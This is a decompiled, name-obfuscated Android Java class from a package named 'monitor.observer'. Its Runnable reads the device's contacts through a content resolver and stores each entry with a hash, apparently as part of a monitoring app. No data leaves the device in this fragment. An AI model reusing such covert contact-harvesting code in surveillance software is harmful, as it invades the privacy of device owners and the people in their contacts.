package com.network.android.monitor.observer;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import com.network.android.c.a.a;

/* access modifiers changed from: package-private */
public final class j implements Runnable {

    /* renamed from: a  reason: collision with root package name */
    final /* synthetic */ Context f95a;

    j(Context context) {
        this.f95a = context;
    }

    public final void run() {
        try {
            ContentResolver contentResolver = this.f95a.getContentResolver();
            Cursor query = contentResolver.query(i.b, null, null, null, null);
            int unused = i.d = query.getCount();
            try {
                if (query.getCount() > 0) {
                    int i = 0;
                    try {
                        a.a("Load Contacts Map start: " + query.getCount());
                        while (query.moveToNext()) {
                            i++;
                            StringBuilder sb = new StringBuilder();
                            i.e.put(i.a(contentResolver, query, sb), Integer.valueOf(sb.toString().hashCode()));
                            if (i % 35 == 0) {
                                Thread.sleep(3);
                            }
                        }
                        a.a("Load Contacts Map end");
                    } catch (Throwable th) {
                        a.a("get contacts scaner Exception- " + th.getMessage(), th);
                    }
                }
                if (query == null || query.isClosed()) {
                    a.b("readCalendar finally - cursor was closed");
                } else {
                    query.close();
                }
                boolean unused2 = i.f = true;
            } catch (Throwable th2) {
                if (query == null || query.isClosed()) {
                    a.b("readCalendar finally - cursor was closed");
                } else {
                    query.close();
                }
                boolean unused3 = i.f = true;
                throw th2;
            }
        } catch (Throwable th3) {
            a.a("get contacts scaner get resolver Exception- " + th3.getMessage(), th3);
        }
    }
}
